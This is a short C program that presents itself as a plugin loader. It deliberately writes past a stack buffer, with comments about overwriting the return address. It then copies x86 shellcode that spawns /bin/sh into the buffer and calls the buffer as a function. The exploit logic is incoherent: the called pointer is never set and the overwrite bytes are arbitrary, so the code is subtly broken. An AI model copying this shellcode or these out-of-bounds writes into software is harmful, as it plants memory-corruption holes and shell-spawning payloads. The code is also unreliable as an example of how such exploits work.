#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <stdio.h>
#include <stdlib.h>

#define PLUGIN_BUFFER_SIZE 1024

typedef void (*plugin_function_t)(int);

void execute_plugin(void* plugin_buffer) {
    plugin_function_t func = *(plugin_function_t*)plugin_buffer;
    func(0);
}

int main() {
    char plugin_buffer[PLUGIN_BUFFER_SIZE];
    
    // Simulate loading a plugin
    ((char*)&plugin_buffer)[PLUGIN_BUFFER_SIZE] = '\x90'; // Overwrite return address on stack
    ((char*)&plugin_buffer)[PLUGIN_BUFFER_SIZE + 1] = '\xe9';
    ((char*)&plugin_buffer)[PLUGIN_BUFFER_SIZE + 2] = '\x2a';
    ((char*)&plugin_buffer)[PLUGIN_BUFFER_SIZE + 3] = '\x01'; // Jump to shellcode location
    ((char*)&plugin_buffer)[PLUGIN_BUFFER_SIZE + 4] = '\x00';

    unsigned char shellcode[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\xb0\x0b\xcd\x80";

    memcpy(plugin_buffer + 5, shellcode, sizeof(shellcode));

    execute_plugin(&plugin_buffer);

    return 0;
}
